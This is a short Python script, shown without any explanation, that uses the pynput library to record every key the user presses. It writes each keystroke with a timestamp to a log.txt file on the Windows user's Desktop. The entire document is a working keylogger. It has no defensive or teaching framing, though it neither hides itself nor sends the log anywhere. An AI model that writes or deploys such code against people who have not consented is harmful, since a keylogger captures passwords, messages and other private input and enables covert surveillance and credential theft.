
########
#imports
########
import os
from pynput.keyboard import Listener
import logging

########
#script
########
user = os.getlogin()
LOG_DIR = f"C:/Users/{user}/Desktop"
logging.basicConfig(filename=f"{LOG_DIR}/log.txt", level=logging.DEBUG,format="%(asctime)s: %(message)s")

def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()